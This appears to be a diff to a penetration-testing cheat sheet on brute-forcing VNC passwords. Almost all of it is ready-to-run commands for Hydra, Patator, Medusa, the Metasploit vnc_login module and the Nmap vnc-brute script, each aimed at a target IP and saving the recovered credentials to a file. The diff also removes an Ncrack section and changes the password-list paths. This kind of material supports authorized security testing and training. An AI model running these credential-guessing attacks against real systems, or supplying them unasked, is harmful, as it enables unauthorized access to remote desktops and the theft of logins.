@@ -2,7 +2,7 @@
 
 ## 01 - Hydra
 
-`$ hydra -vvv -P <password_list> -e nsr -t 16 <IP> vnc -o vnc_creds.txt`
+`$ hydra -vvv -P passwords.lst -e nsr -t 16 <IP> vnc -o vnc_creds.txt`
 
 ## 02 - Crowbar
 
@@ -12,17 +12,13 @@ TODO: Provide a syntax of vnckey to brute force targets with crowbar
 
 ## 03 - Patator
 
-`$ patator vnc_login host=<IP> password=FILE0 0=<password_list> -t 1 -x retry:fgrep!='Authentication failure' --max-retries 0 -x quit:code=0 -R vnc_creds.txt`
+`$ patator vnc_login host=<IP> password=FILE0 0=passwords.lst -t 1 -x retry:fgrep!='Authentication failure' --max-retries 0 -x quit:code=0 -R vnc_creds.txt`
 
 ## 04 - Medusa
 
-`$ medusa -h <IP> -u root -P <password_list> -M vnc | tee vnc_creds.txt`
+`$ medusa -h <IP> -u root -P passwords.lst -M vnc | tee vnc_creds.txt`
 
-## 05 - Ncrack
-
-`$ ncrack -V --user root -P <password_list> -oN vnc_creds.txt <IP>:5900`
-
-## 06 - Metasploit
+## 05 - Metasploit
 
 ```
 msf > use auxiliary/scanner/vnc/vnc_login
@@ -56,14 +52,14 @@ msf auxiliary(scanner/vnc/vnc_login) > set rhosts <IP>
 
 msf auxiliary(scanner/vnc/vnc_login) > set rport <PORT>
 
-msf auxiliary(scanner/vnc/vnc_login) > set PASS_FILE /path/to/passwords.txt
+msf auxiliary(scanner/vnc/vnc_login) > set PASS_FILE passwords.lst
 
 msf auxiliary(scanner/vnc/vnc_login) > set threads 4
 
 msf auxiliary(scanner/vnc/vnc_login) > exploit
 ```
 
-## 07 - Nmap
+## 06 - Nmap
 
 `$ nmap -p 5900 --script vnc-brute --script-args passdb=passwords.lst <IP>`
 
